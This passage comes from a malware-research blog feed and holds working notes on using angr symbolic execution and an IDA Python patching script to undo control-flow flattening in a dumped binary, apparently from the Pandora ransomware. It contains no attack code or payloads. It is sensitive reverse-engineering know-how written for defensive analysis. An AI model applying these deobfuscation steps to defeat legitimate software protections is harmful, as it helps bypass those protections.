&lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06a30 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06bbb &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067c8 &lt;SimulationManager with 1 active&gt; Found detached block: 0x7ff6c4b070d1! . # Solve: state_2_2 (good one to copy) ##################################### simgr_dispatcher_2_2 = project.factory.simgr(state_2_2) stop_flag = False while True: simgr_dispatcher_2_2.step() print(simgr_dispatcher_2_2) if len(simgr_dispatcher_2_2.active) == 0: print(f&quot;Dead State!&quot;) stop_flag = True break if len(simgr_dispatcher_2_2.active) &gt; 1: print(f&quot;Multiple states: {len(simgr_dispatcher_2_2.active)}!&quot;) stop_flag = True break if simgr_dispatcher_2_2.active[0].addr == detatched_bb: print(f&quot;Found detached block: {hex(simgr_dispatcher_2_2.active[0].addr)}!&quot;) stop_flag = True break if simgr_dispatcher_2_2.active[0].addr in orig_code_bb: print(f&quot;Found original code block&quot;) break print(f&quot;Step: {hex(simgr_dispatcher_2_2.active[0].addr)}&quot;) if stop_flag: print(f&quot;Stopped on bb: {hex(state_2_2_eax)}&quot;) else: state_2_2_end = simgr_dispatcher_2_2.active[0] state_2_2_bb = state_2_2_end.addr print(f&quot;state_1_eax:{hex(state_2_2_eax)} -&gt; bb: {hex(state_2_2_bb)}&quot;) print(f&quot;** Find next state(s)&quot;) # Run until dispatcher to get new state(s) ob_dead_flag = False while True: simgr_dispatcher_2_2.step() print(simgr_dispatcher_2_2) if len(simgr_dispatcher_2_2.active) == 0: print(f&quot;Dead end!&quot;) ob_dead_flag = True break if len(simgr_dispatcher_2_2.active) &gt; 1: print(f&quot;Multiple states in original bb {len(simgr_dispatcher_2_2.active)}!&quot;) ob_dead_flag = True break if simgr_dispatcher_2_2.active[0].addr == dispatcher_start: print(f&quot;Found dispatcher&quot;) break print(f&quot;Step: {hex(simgr_dispatcher.active[0].addr)}&quot;) if not ob_dead_flag: # This is the start of state 3 state_3_2 = simgr_dispatcher_2_2.active[0] # Retrieve all potential eax values state_3_2_eax_values = state_3_2.solver.eval_upto(state_3_2.regs.eax, 8) print(f&quot;Number of possible state values: {len(state_3_2_eax_values)}&quot;) # If there is more than one next state that means our code block will require a conditional jmp to replace # the state machine, we will need to find end process both next states as well as determine what conditions # cause each state if len(state_3_2_eax_values) == 1: state_3_2_eax_value = state_3_2_eax_values[0] print(f&quot;Unconditonal JMP - State eax: {hex(state_3_2_eax_value)}&quot;) else: for state_3_2_eax_value in state_3_2_eax_values: print(f&quot;state_3_2_eax:{hex(state_3_2_eax_value)}&quot;) # For each eax state we are going to need the associated flags to eventually replace the conditional # cmov with a conditional jmp flags_values = state_3_2.solver.eval_upto(state_3_2.regs.flags, 2, extra_constraints=[state_3_2.regs.eax == state_3_2_eax_value]) if len(flags_values) == 1: # This is the constrained state we must save these flags with the state print(f&quot;Constrained state: {hex(state_3_2_eax_value)}&quot;) flags = flags_values[0] print(f&quot;flags:{hex(flags)}&quot;) f = Flags(flags) print(f&quot;CF: {f.CF}&quot;) print(f&quot;PF: {f.PF}&quot;) print(f&quot;AF: {f.AF}&quot;) print(f&quot;ZF: {f.ZF}&quot;) print(f&quot;SF: {f.SF}&quot;) print(f&quot;TF: {f.TF}&quot;) print(f&quot;IF: {f.IF}&quot;) print(f&quot;DF: {f.DF}&quot;) print(f&quot;OF: {f.OF}&quot;) else: # This is the unconstrained state, we don&#39;t need to save anything print(f&quot;Unconstrained state: {hex(state_3_2_eax_value)}&quot;) . WARNING | 2022-03-31 15:04:35,479 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeffa8 with 4 unconstrained bytes referenced from 0x7ff6c4b06da8 (offset 0x6da8 in pandora_dump_SCY.bin (0x7ff6c4b06da8)) . &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b068b0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b068c7 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b068e3 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06ce1 &lt;SimulationManager with 1 active&gt; Found original code block state_1_eax:0x173ba5e1 -&gt; bb: 0x7ff6c4b06cfd ** Find next state(s) &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Found dispatcher Number of possible state values: 1 Unconditonal JMP - State eax: 0x7a980236 . Complete Solution . import angr import claripy import struct from queue import Queue BINARY_PATH = &#39;/tmp/pandora_dump_SCY.bin&#39; # Information about the function which we can get from IDA entry_point = 0x00007FF6C4B066F0 dispatcher_start = 0x00007FF6C4B067F0 # Original code bb addresses orig_code_bb = [0x7ff6c4b0687f, 0x7ff6c4b0691a, 0x7ff6c4b06a04, 0x7ff6c4b06a84, 0x7ff6c4b06ad1, 0x7ff6c4b06b3b, 0x7ff6c4b06b9b, 0x7ff6c4b06bf3, 0x7ff6c4b06c61, 0x7ff6c4b06cfd, 0x7ff6c4b06e9f, 0x7ff6c4b06ef8, 0x7ff6c4b06f58, 0x7ff6c4b07024] ret_bb = 0x7FF6C4B0706E orig_code_bb.append(ret_bb) detatched_bb = 0x00007FF6C4B070D1 interrupt_bb = 0x00007FF6C4B070EA project = angr.Project(BINARY_PATH, load_options={&#39;auto_load_libs&#39;: False}) # Start at function entrypoint initial_state = project.factory.call_state(addr=entry_point) # Use this setting to skip calls instead of a hook initial_state.options.add(angr.options.CALLLESS) simgr = project.factory.simgr(initial_state) # Explore to dispatcher start simgr.run(until=lambda s: s.active[0].addr == dispatcher_start) print(simgr.active) # Save the initial state at the dispatcher initial_dispatcher_state = simgr.active[0].copy() # Get initial state for eax eax_initial = initial_dispatcher_state.solver.eval_one(initial_dispatcher_state.regs.eax) print(f&quot;Initial state address {initial_dispatcher_state}&quot;) print(f&quot;Initial eax: {hex(eax_initial)}&quot;) def find_obb(eax_state): # # Returns the state, and the address of the obb (state,obb_address) # ** Will return NONE for obb unreachable (caller must handle this) # ** Will detached bb address if detached block found (caller must handle this) # return_state = None obb_address = None # Make a copy of the state so we can restore the original if we need state = initial_dispatcher_state.copy() # Set the eax value for the state state.regs.eax = state.solver.BVV(eax_state, 32) # Build a sim manager for our state simgr = project.factory.simgr(state) # Add danger limit for our loop danger_limit = 0 # Step until we hit a obb or we can&#39;t reach an obb while danger_limit &lt;= 10000: danger_limit += 1 simgr.step() if len(simgr.active) == 0: #print(f&quot;Dead State!&quot;) # Return nothing for dead state return None,None if len(simgr.active) &gt; 1: #print(f&quot;Multiple states: {len(simgr.active)}!&quot;) # Return nothing for branched state -- this shouldn&#39;t happen return None,None if simgr.active[0].addr == detatched_bb: #print(f&quot;Found detached block: {hex(simgr.active[0].addr)}!&quot;) # Return the return_state = None obb_address = simgr.active[0].addr return return_state, obb_address if simgr.active[0].addr in orig_code_bb: #print(f&quot;Found original code block&quot;) return simgr.active[0].copy(),simgr.active[0].addr print(f&quot;Step: {hex(simgr.active[0].addr)}&quot;) def find_dispatcher(current_state): # # Returns the next state values and associated flags [(state_value,flags)] # ** if the state is unconstrained the flags will be NONE # ** if the dispatcher is unreachable we return an empty set [] state_values = [] # Make a copy of the state so we can restore the original if we need state = current_state.copy() # Build sim manager for state simgr = project.factory.simgr(state) # Add danger limit for our loop danger_limit = 0 # Step until we hit dispatcher while danger_limit &lt;= 10000: danger_limit += 1 simgr.step() if len(simgr.active) == 0: #print(f&quot;Dead end!&quot;) return [] if len(simgr.active) &gt; 1: #print(f&quot;Multiple states in original bb {len(simgr.active)}!&quot;) return [] if simgr.active[0].addr == dispatcher_start: #print(f&quot;Found dispatcher&quot;) break print(f&quot;Step: {hex(simgr.active[0].addr)}&quot;) # If we got here we have some next states for the obb let&#39;s solve for them current_state= simgr.active[0] # Retrieve all potential eax values eax_values = current_state.solver.eval_upto(current_state.regs.eax, 8) #print(f&quot;Number of possible state values: {len(eax_values)}&quot;) # If there is more than one next state that means our code block will require a conditional jmp to replace # the state machine, we will need to find end process both next states as well as determine what conditions # cause each state if len(eax_values) == 1: eax_value = eax_values[0] #print(f&quot;Unconditonal JMP - State eax: {hex(eax_value)}&quot;) state_values.append((eax_value,None)) else: for eax_value in eax_values: #print(f&quot;eax_value:{hex(eax_value)}&quot;) # For each eax state we are going to need the associated flags to eventually replace the conditional # cmov with a conditional jmp flags_values = current_state.solver.eval_upto(current_state.regs.flags, 2, extra_constraints=[current_state.regs.eax == eax_value]) # if len(flags_values) == 1: # This is the constrained state we must save these flags with the state #print(f&quot;Constrained state: {hex(eax_value)}&quot;) flags = flags_values[0] state_values.append((eax_value,flags)) # else: # # This is the unconstrained state, we don&#39;t need to save anything # #print(f&quot;Unconstrained state: {hex(eax_value)}&quot;) # state_values.append((eax_value,None)) return state_values def get_state_info(state_value): # (obb_address, [(state,flags)]) obb_state,obb_address = find_obb(state_value) # Check if we hit a dead state if obb_address == None: print(f&quot;Dead state: {hex(state_value)}&quot;) return None # Check if we a detached bb elif obb_address == detatched_bb: print(f&quot;Detached BB: State:{hex(state_value)} -&gt; bb: {hex(obb_address)}&quot;) return (obb_address, []) else: print(f&quot;State:{hex(state_value)} -&gt; bb: {hex(obb_address)}&quot;) # Find next states next_states = find_dispatcher(obb_state) # Check if end code block (no path to dispatcher) if len(next_states) == 0: print(f&quot;{hex(obb_address)} is end state!&quot;) return (obb_address, []) # Check if this is an unconditional jmp elif len(next_states) == 1: print(f&quot;{hex(obb_address)} -&gt; jmp state:{hex(next_states[0][0])}&quot;) return (obb_address, next_states) # If there are multiple states print the conditions else: for next_state in next_states: if next_state[1] == None: # This is unconditional jmp print(f&quot;{hex(obb_address)} -&gt; jmp state:{hex(next_state[0])}&quot;) else: # This is a conditional jmp print(f&quot;{hex(obb_address)} -&gt; conditional jmp state:{hex(next_state[0])}&quot;) return (obb_address, next_states) # state_table[state] = (obb_address, [(state,flags)]) state_table = {} q = Queue() q.put(eax_initial) while not q.empty(): state_value = q.get() state_info = get_state_info(state_value) if state_info is not None: state_table[state_value] = state_info # If we have a new state add it to the queue for next_state in state_info[1]: next_state_value = next_state[0] if next_state_value not in state_table: q.put(next_state_value) . WARNING | 2022-03-31 17:31:51,900 | angr.calling_conventions | Guessing call prototype. Please specify prototype. WARNING | 2022-03-31 17:31:51,910 | angr.storage.memory_mixins.default_filler_mixin | Filling register r15 with 8 unconstrained bytes referenced from 0x7ff6c4b066f0 (offset 0x66f0 in pandora_dump_SCY.bin (0x7ff6c4b066f0)) WARNING | 2022-03-31 17:31:51,912 | angr.storage.memory_mixins.default_filler_mixin | Filling register r14 with 8 unconstrained bytes referenced from 0x7ff6c4b066f2 (offset 0x66f2 in pandora_dump_SCY.bin (0x7ff6c4b066f2)) WARNING | 2022-03-31 17:31:51,914 | angr.storage.memory_mixins.default_filler_mixin | Filling register r13 with 8 unconstrained bytes referenced from 0x7ff6c4b066f4 (offset 0x66f4 in pandora_dump_SCY.bin (0x7ff6c4b066f4)) WARNING | 2022-03-31 17:31:51,916 | angr.storage.memory_mixins.default_filler_mixin | Filling register r12 with 8 unconstrained bytes referenced from 0x7ff6c4b066f6 (offset 0x66f6 in pandora_dump_SCY.bin (0x7ff6c4b066f6)) WARNING | 2022-03-31 17:31:51,917 | angr.storage.memory_mixins.default_filler_mixin | Filling register rsi with 8 unconstrained bytes referenced from 0x7ff6c4b066f8 (offset 0x66f8 in pandora_dump_SCY.bin (0x7ff6c4b066f8)) WARNING | 2022-03-31 17:31:51,919 | angr.storage.memory_mixins.default_filler_mixin | Filling register rdi with 8 unconstrained bytes referenced from 0x7ff6c4b066f9 (offset 0x66f9 in pandora_dump_SCY.bin (0x7ff6c4b066f9)) WARNING | 2022-03-31 17:31:51,920 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbp with 8 unconstrained bytes referenced from 0x7ff6c4b066fa (offset 0x66fa in pandora_dump_SCY.bin (0x7ff6c4b066fa)) WARNING | 2022-03-31 17:31:51,921 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbx with 8 unconstrained bytes referenced from 0x7ff6c4b066fb (offset 0x66fb in pandora_dump_SCY.bin (0x7ff6c4b066fb)) WARNING | 2022-03-31 17:31:51,995 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b067f0 (offset 0x67f0 in pandora_dump_SCY.bin (0x7ff6c4b067f0)) WARNING | 2022-03-31 17:31:52,102 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeffa8 with 4 unconstrained bytes referenced from 0x7ff6c4b06da8 (offset 0x6da8 in pandora_dump_SCY.bin (0x7ff6c4b06da8)) . [&lt;SimState @ 0x7ff6c4b067f0&gt;] Initial state address &lt;SimState @ 0x7ff6c4b067f0&gt; Initial eax: 0x8cbc0434 Step: 0x7ff6c4b06819 Step: 0x7ff6c4b06830 Step: 0x7ff6c4b06847 Step: 0x7ff6c4b06863 State:0x8cbc0434 -&gt; bb: 0x7ff6c4b0687f 0x7ff6c4b0687f -&gt; conditional jmp state:0x7d9d86f3 0x7ff6c4b0687f -&gt; conditional jmp state:0x173ba5e1 Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b06a30 Step: 0x7ff6c4b06bbb Step: 0x7ff6c4b067c8 Detached BB: State:0x7d9d86f3 -&gt; bb: 0x7ff6c4b070d1 Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b068c7 Step: 0x7ff6c4b068e3 Step: 0x7ff6c4b06ce1 State:0x173ba5e1 -&gt; bb: 0x7ff6c4b06cfd Step: 0x7ff6c4b06d2e Step: 0x7ff6c4b06d54 Step: 0x7ff6c4b06d67 Step: 0x7ff6c4b06d7a Step: 0x7ff6c4b06d95 Step: 0x7ff6c4b06da8 Step: 0x7ff6c4b06dd5 Step: 0x7ff6c4b06df2 Step: 0x7ff6c4b06e05 Step: 0x7ff6c4b06e20 Step: 0x7ff6c4b06e33 . WARNING | 2022-03-31 17:31:52,166 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff60 with 8 unconstrained bytes referenced from 0x7ff6c4b06ef8 (offset 0x6ef8 in pandora_dump_SCY.bin (0x7ff6c4b06ef8)) WARNING | 2022-03-31 17:31:52,200 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b067f0 (offset 0x67f0 in pandora_dump_SCY.bin (0x7ff6c4b067f0)) WARNING | 2022-03-31 17:31:52,265 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff50 with 8 unconstrained bytes referenced from 0x7ff6c4b0694d (offset 0x694d in pandora_dump_SCY.bin (0x7ff6c4b0694d)) WARNING | 2022-03-31 17:31:52,266 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff40 with 8 unconstrained bytes referenced from 0x7ff6c4b06952 (offset 0x6952 in pandora_dump_SCY.bin (0x7ff6c4b06952)) . Step: 0x7ff6c4b06e57 0x7ff6c4b06cfd -&gt; jmp state:0x7a980236 Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b06a30 Step: 0x7ff6c4b06a4c Step: 0x7ff6c4b06edc State:0x7a980236 -&gt; bb: 0x7ff6c4b06ef8 0x7ff6c4b06ef8 -&gt; conditional jmp state:0x10bc6c78 0x7ff6c4b06ef8 -&gt; conditional jmp state:0xa22a16af Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b068c7 Step: 0x7ff6c4b068e3 Step: 0x7ff6c4b068ff State:0x10bc6c78 -&gt; bb: 0x7ff6c4b0691a Step: 0x7ff6c4b0694d . WARNING | 2022-03-31 17:31:52,703 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff34 with 4 unconstrained bytes referenced from 0x7ff6c4b06c61 (offset 0x6c61 in pandora_dump_SCY.bin (0x7ff6c4b06c61)) WARNING | 2022-03-31 17:31:52,755 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b067f0 (offset 0x67f0 in pandora_dump_SCY.bin (0x7ff6c4b067f0)) . Step: 0x7ff6c4b06976 Step: 0x7ff6c4b06992 0x7ff6c4b0691a -&gt; jmp state:0x7a980236 Step: 0x7ff6c4b06819 Step: 0x7ff6c4b06830 Step: 0x7ff6c4b06847 Step: 0x7ff6c4b06c45 State:0xa22a16af -&gt; bb: 0x7ff6c4b06c61 Step: 0x7ff6c4b06c85 Step: 0x7ff6c4b06ca6 Step: 0x7ff6c4b06cb9 0x7ff6c4b06c61 -&gt; conditional jmp state:0x3cd69d30 0x7ff6c4b06c61 -&gt; conditional jmp state:0x7d71a1e3 Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b068c7 Step: 0x7ff6c4b06b09 Step: 0x7ff6c4b07008 . WARNING | 2022-03-31 17:31:52,813 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff38 with 4 unconstrained bytes referenced from 0x7ff6c4b07045 (offset 0x7045 in pandora_dump_SCY.bin (0x7ff6c4b07045)) WARNING | 2022-03-31 17:31:52,845 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff50 with 8 unconstrained bytes referenced from 0x7ff6c4b06c1c (offset 0x6c1c in pandora_dump_SCY.bin (0x7ff6c4b06c1c)) WARNING | 2022-03-31 17:31:52,880 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff2c with 4 unconstrained bytes referenced from 0x7ff6c4b06a04 (offset 0x6a04 in pandora_dump_SCY.bin (0x7ff6c4b06a04)) WARNING | 2022-03-31 17:31:52,883 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff26 with 2 unconstrained bytes referenced from 0x7ff6c4b06a22 (offset 0x6a22 in pandora_dump_SCY.bin (0x7ff6c4b06a22)) WARNING | 2022-03-31 17:31:52,886 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b06a22 (offset 0x6a22 in pandora_dump_SCY.bin (0x7ff6c4b06a22)) . State:0x3cd69d30 -&gt; bb: 0x7ff6c4b07024 0x7ff6c4b07024 -&gt; jmp state:0xc30bae2e Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b06a30 Step: 0x7ff6c4b06bbb Step: 0x7ff6c4b06bd7 State:0x7d71a1e3 -&gt; bb: 0x7ff6c4b06bf3 Step: 0x7ff6c4b06c0f Step: 0x7ff6c4b06c40 Step: 0x7ff6c4b06ecc 0x7ff6c4b06bf3 -&gt; jmp state:0xa2992627 Step: 0x7ff6c4b06819 Step: 0x7ff6c4b069b0 Step: 0x7ff6c4b069cc Step: 0x7ff6c4b069e8 State:0xc30bae2e -&gt; bb: 0x7ff6c4b06a04 0x7ff6c4b06a04 -&gt; conditional jmp state:0x6c249751 0x7ff6c4b06a04 -&gt; conditional jmp state:0x3b2b8a1e Step: 0x7ff6c4b06819 Step: 0x7ff6c4b06830 Step: 0x7ff6c4b06a99 Step: 0x7ff6c4b06ab5 State:0xa2992627 -&gt; bb: 0x7ff6c4b06ad1 0x7ff6c4b06ad1 -&gt; jmp state:0xecce8ff1 Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b06a30 Step: 0x7ff6c4b06a4c Step: 0x7ff6c4b06a68 State:0x6c249751 -&gt; bb: 0x7ff6c4b06a84 0x7ff6c4b06a84 -&gt; jmp state:0x7d71a1e3 Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b068c7 . WARNING | 2022-03-31 17:31:53,034 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff3c with 4 unconstrained bytes referenced from 0x7ff6c4b06b3b (offset 0x6b3b in pandora_dump_SCY.bin (0x7ff6c4b06b3b)) WARNING | 2022-03-31 17:31:53,067 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b067f0 (offset 0x67f0 in pandora_dump_SCY.bin (0x7ff6c4b067f0)) WARNING | 2022-03-31 17:31:53,118 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff78 with 8 unconstrained bytes referenced from 0x7ff6c4b0706e (offset 0x706e in pandora_dump_SCY.bin (0x7ff6c4b0706e)) WARNING | 2022-03-31 17:31:53,160 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff26 with 2 unconstrained bytes referenced from 0x7ff6c4b06b9f (offset 0x6b9f in pandora_dump_SCY.bin (0x7ff6c4b06b9f)) . Step: 0x7ff6c4b06b09 Step: 0x7ff6c4b06b20 State:0x3b2b8a1e -&gt; bb: 0x7ff6c4b06b3b 0x7ff6c4b06b3b -&gt; conditional jmp state:0xd43fb344 0x7ff6c4b06b3b -&gt; conditional jmp state:0xc094d6c9 Step: 0x7ff6c4b06819 Step: 0x7ff6c4b069b0 Step: 0x7ff6c4b06b63 Step: 0x7ff6c4b07052 State:0xecce8ff1 -&gt; bb: 0x7ff6c4b0706e Step: 0x7ff6c4b07090 Step: 0x7ff6c4b070ae Step: 0xffed89901000 0x7ff6c4b0706e is end state! Step: 0x7ff6c4b06819 Step: 0x7ff6c4b069b0 Step: 0x7ff6c4b06b63 Step: 0x7ff6c4b06b7f State:0xd43fb344 -&gt; bb: 0x7ff6c4b06b9b 0x7ff6c4b06b9b -&gt; jmp state:0xc30bae2e Step: 0x7ff6c4b06819 Step: 0x7ff6c4b06830 Step: 0x7ff6c4b06a99 Step: 0x7ff6c4b06f3d State:0xc094d6c9 -&gt; bb: 0x7ff6c4b06f58 Step: 0x7ff6c4b06f70 . WARNING | 2022-03-31 17:31:53,486 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff58 with 8 unconstrained bytes referenced from 0x7ff6c4b06f7e (offset 0x6f7e in pandora_dump_SCY.bin (0x7ff6c4b06f7e)) . Step: 0x7ff6c4b06f9f Step: 0x7ff6c4b06fc9 Step: 0x7ff6c4b06ff8 0x7ff6c4b06f58 -&gt; jmp state:0xd43fb344 . state_table . {2361132084: (140697838577791, [(2107475699, 0), (389785057, 68)]), 2107475699: (140697838579921, []), 389785057: (140697838578941, [(2056782390, None)]), 2056782390: (140697838579448, [(280783992, 149), (2720667311, 148)]), 280783992: (140697838577946, [(2056782390, None)]), 2720667311: (140697838578785, [(1020697904, 0), (2104599011, 68)]), 1020697904: (140697838579748, [(3272322606, None)]), 2104599011: (140697838578675, [(2727945767, None)]), 3272322606: (140697838578180, [(1814337361, 148), (992709150, 149)]), 2727945767: (140697838578385, [(3972960241, None)]), 1814337361: (140697838578308, [(2104599011, None)]), 992709150: (140697838578491, [(3560944452, 68), (3230979785, 0)]), 3972960241: (140697838579822, []), 3560944452: (140697838578587, [(3272322606, None)]), 3230979785: (140697838579544, [(3560944452, None)])} . Build Patching Script in IDA Python . For each obb look up the state_info . if not conditional jmp then patch last bytes in obb with jmp -&gt; state (lookup state address) | if conditional then read in the last few bytes of the obb and try to determin the condition compare the condition with the saved flags for each state | add one conditional jmp based on the flags | add one unconditional jmp for the other state | . | . class Flags: def __init__(self, register): self.CF = False self.PF = False self.AF = False self.ZF = False self.SF = False self.TF = False self.IF = False self.DF = False self.OF = False if register &amp; 0x0001 == 0x0001: self.CF = True if register &amp; 0x0004 == 0x0004: self.PF = True if register &amp; 0x0010 == 0x0010: self.AF = True if register &amp; 0x0040 == 0x0040: self.ZF = True if register &amp; 0x0080 == 0x0080: self.SF = True if register &amp; 0x0100 == 0x0100: self.TF = True if register &amp; 0x0200 == 0x0200: self.IF = True if register &amp; 0x0400 == 0x0400: self.DF = True if register &amp; 0x0800 == 0x0800: self.OF = True state_table = {2361132084: (140697838577791, [(2107475699, 0), (389785057, 68)]), 2107475699: (140697838579921, []), 389785057: (140697838578941, [(2056782390, None)]), 2056782390: (140697838579448, [(280783992, 149), (2720667311, 148)]), 280783992: (140697838577946, [(2056782390, None)]), 2720667311: (140697838578785, [(1020697904, 0), (2104599011, 68)]), 1020697904: (140697838579748, [(3272322606, None)]), 2104599011: (140697838578675, [(2727945767, None)]), 3272322606: (140697838578180, [(1814337361, 148), (992709150, 149)]), 2727945767: (140697838578385, [(3972960241, None)]), 1814337361: (140697838578308, [(2104599011, None)]), 992709150: (140697838578491, [(3560944452, 68), (3230979785, 0)]), 3972960241: (140697838579822, []), 3560944452: (140697838578587, [(3272322606, None)]), 3230979785: (140697838579544, [(3560944452, None)])} orig_code_bb = [0x7ff6c4b0687f, 0x7ff6c4b0691a, 0x7ff6c4b06a04, 0x7ff6c4b06a84, 0x7ff6c4b06ad1, 0x7ff6c4b06b3b, 0x7ff6c4b06b9b, 0x7ff6c4b06bf3, 0x7ff6c4b06c61, 0x7ff6c4b06cfd, 0x7ff6c4b06e9f, 0x7ff6c4b06ef8, 0x7ff6c4b06f58, 0x7ff6c4b07024] entry_point = 0x00007FF6C4B066F0 ret_bb = 0x7FF6C4B0706E detatched_bb = 0x00007FF6C4B070D1 # Add these blocks so we test them as well orig_code_bb.append(entry_point) orig_code_bb.append(ret_bb) orig_code_bb.append(detatched_bb) # we also need to fake an initial block so that the entrypoint has some state info # We know that it jumps to the initial state so just add it manually # Initial eax: 0x8cbc0434 state_table[0xffff] = (0x00007FF6C4B066F0, [0x8cbc0434, None]) for obb_addr in orig_code_bb: for state in state_table: state_info = state_table[state] if obb_addr == state_info[0]: # Found the obb info if len(state_info[1]) == 0: # This is an end state do nothing break elif len(state_info[1]) == 1: # Unconditional jmp # Determine next_obb address from next_state next_state = state_info[1][0][0] next_obb_address = state_table[next_state][0] # Iterate through obb until we hit the jmp # replace it with the new state obb address ptr = obb_addr while print_insn_mnem(ptr) != &#39;jmp&#39;: ptr = next_head(ptr) jmp_rel = next_obb_address - (ptr + 5) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) #print(f&quot;Unconditional patch {patch_jmp} at {hex(ptr)}&quot;) # Patch bytes ida_bytes.patch_bytes(ptr,patch_jmp) break else: # Conditional jmp print(f&quot;obb: {hex(obb_addr)}&quot;) ptr = obb_addr conditional_jmp_instruction = None conditional_jmp_address = None unconditional_jmp_address = None while print_insn_mnem(ptr) != &#39;jmp&#39;: instruction = print_insn_mnem(ptr) if &quot;cmovnz&quot; == instruction: # Use a JNZ (ZF=0) # Check the flags for both next states # Make sure on one flag set statisfies condition next_state_info_1 = state_info[1][0] next_state_info_2 = state_info[1][1] f = Flags(next_state_info_1[1]) conditional_jmp_instruction = b&#39; x0F x85&#39; if not f.ZF: # Found our conditional state next_state_info_1 conditional_jmp_address = state_table[next_state_info_1[0]][0] unconditional_jmp_address = state_table[next_state_info_2[0]][0] else: # Found our conditional state next_state_info_2 conditional_jmp_address = state_table[next_state_info_2[0]][0] unconditional_jmp_address = state_table[next_state_info_1[0]][0] if &quot;cmovb&quot; == instruction: # Use a JB (CF=1) # Check the flags for both next states # Make sure on one flag set statisfies condition next_state_info_1 = state_info[1][0] next_state_info_2 = state_info[1][1] f = Flags(next_state_info_1[1]) conditional_jmp_instruction = b&#39; x0F x82&#39; if f.CF: # Found our conditional state next_state_info_1 conditional_jmp_address = state_table[next_state_info_1[0]][0] unconditional_jmp_address = state_table[next_state_info_2[0]][0] else: # Found our conditional state next_state_info_2 conditional_jmp_address = state_table[next_state_info_2[0]][0] unconditional_jmp_address = state_table[next_state_info_1[0]][0] # Increment to next instruction ptr = next_head(ptr) # Build patch for conditional jmp jmp_rel = conditional_jmp_address - (ptr + 6) patch_cond_jmp = conditional_jmp_instruction + struct.pack(&#39;&lt;i&#39;,jmp_rel) # Patch bytes #print(f&quot;Conditional patch (cond) {patch_cond_jmp} at {hex(ptr)}&quot;) ida_bytes.patch_bytes(ptr,patch_cond_jmp) ptr += 6 # Build patch for unconditional jmp jmp_rel = unconditional_jmp_address - (ptr + 5) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) # Patch bytes ida_bytes.patch_bytes(ptr,patch_jmp) #print(f&quot;Conditional patch (uncon) {patch_jmp} at {hex(ptr)}&quot;) break . TODO . There are a few things we can improve on. First, we seem to have some orphaned obbs once we do the patching. This is likely becuase we didn&#39;t test one of the states. . This means that we have some error in our path traversal through the dispatcher. All possibilites should be reachable from the entrypoint (by definition). . Possibly we need to keep the sim manager state for new eax state we test instead of resetting it. .",
            "url": "https://research.openanalysis.net/angr/symbolic%20execution/deobfuscation/research/2022/03/26/angr_notes.html",
            "relUrl": "/angr/symbolic%20execution/deobfuscation/research/2022/03/26/angr_notes.html",
            "date": " • Mar 26, 2022"
        }
        
    
  
    
        ,"post16": {
            "title": "Pandora Ransomware",
